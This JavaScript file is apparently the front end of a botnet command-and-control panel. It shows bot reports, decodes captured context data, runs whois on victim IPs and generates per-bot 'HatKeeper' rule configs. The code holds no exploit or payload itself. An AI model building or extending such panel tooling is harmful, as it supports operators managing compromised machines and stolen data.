$(function(){

	// Language
    window.lexicon.extend({
        ru: {
            'saved': 'Сохранено'
        },
        en: {
            'saved': 'Saved'
        }
    });

	var $report = $('#full-bot-report');

	// Encode/Decode button
	$('tr.context #decode-context').click(function(){
		var $context = $('tr.context .context');
		var original = $context.data('original');
		if (original === undefined){
			// Decode
			var context = $context.html();
			$context.data('original', context);
			context = decodeURIComponent(context.replace(/\\+/g, ' '));
			$context.html(context);
		} else {
			// Revert
			$context.html(original);
			$context.removeData('original');
		}
		return false;
	});

	// Collapsibles
	$('aside.sidebar dl dt.collapsible').click(function(){
		var $dt = $(this);
		$dt.toggleClass('collapsed');

		var $dd = $dt.next('dd');
		if ($dt.hasClass('collapsed'))
			$dd.hide('fast');
		else
			$dd.show('fast');
	}).filter('.collapsed').each(function(){
		var $dt = $(this);
		var $dd = $dt.next('dd');
		$dd.hide();
	});

	// Set max width of tr.context pre
	var aside_width = $('aside.sidebar').outerWidth(true) + 32;
	var $pre_context = $report.find('.context pre, .context .context');
	$(window).resize(function(){
		$pre_context.css('width', $(document).width() - aside_width);
	}).resize().resize();

	// Whois
	$('aside.sidebar #aside-report-whois button').click(function(){
		var $btn = $(this);
		var btn_old_text = $btn.text();

		var ip_addr = $report.data('ipv4');
		$.get('?m=botnet_socks&ajax=whois', {ip: ip_addr}, function(whois){
			var whois_str = whois.join(' ');
			var $whois = $('<span class="whois"></span>').text(whois_str).hide();

			// Add to the report
			$report.data('whois', whois);
			$report.find('tr.field-ipv4 td').append($whois);

			// Add to favorite
			$('aside.sidebar #aside-report-favorite form textarea').prepend('Whois '+ ip_addr +' : ' + whois_str + "\n");

			// Animate
			$btn.text(btn_old_text);
			$whois.show('slow');
		});
		$btn.text('...');
		return false;
	});

	// Favorite initial
	(function(){
		var $btn = $('aside.sidebar #aside-report-favorite button');
		var $form = $btn.next('form');
		var $comment = $form.find('textarea');

		if ($comment.val()){
			$btn.hide();
			$form.show();
		}
	})();

	// Favorite
	$('aside.sidebar #aside-report-favorite button').click(function(){
		var $btn = $(this);
		var $form = $btn.next('form');
		var $comment = $form.find('textarea');
		var $submit = $form.find('input:submit');

		// Show
		$form.show('slow');
		$btn.hide();
		$('<h1></h1>').text($btn.text()).prependTo($btn.parent());
		return false;
	});

	// Favorite: save
	$('aside.sidebar #aside-report-favorite').on('submit', 'form', function(){
		var $form = $(this);
		var $submit = $form.find('input:submit');
		$.post($form.attr('action'), $form.serialize(), function(){
			$submit.fadeTo('fast', 1);
			$.jlog('ok', window.lexicon.get('saved'));
		});
		$submit.fadeTo('slow', 0.2);
		return false;
	});

	// Hatkeeper: save
	$('aside.sidebar #aside-hatkeeper').on('submit', 'form', function(){
		var $form = $(this);
		var botId = $form.closest('aside').data('botid');
		var jlog_msg = 'HatKeeper config generation for: '+botId;

		// AJAX post the form
		$.post($form.attr('action'), $form.serialize(), function(data){
			$.jlog('saved', 'HatKeeper config');

			// Ask HatKeeper to prepare the config
			$.jlog('started', jlog_msg);
			$.get('?m=reports_hatkeeper/update&botId='+botId, function(){
				// Display the config link
				$('aside.sidebar #aside-hatkeeper #hatkeeper-config-link').show('slow').on('click', function(){
					return false; // Don't open the link
				});

				// Log
				$.jlog('finished', jlog_msg);
			});
		});
		return false;
	});

	// Hatkeeper: Rule presets switcher
	$('aside.sidebar #aside-hatkeeper dd ul.url-rule-presets a').click(function(){
		var $a = $(this);
		var $rule_url = $a.closest('form').find('input[name="rule_url"]');
		$rule_url.val($a.data('url'));
		return false;
	});
});
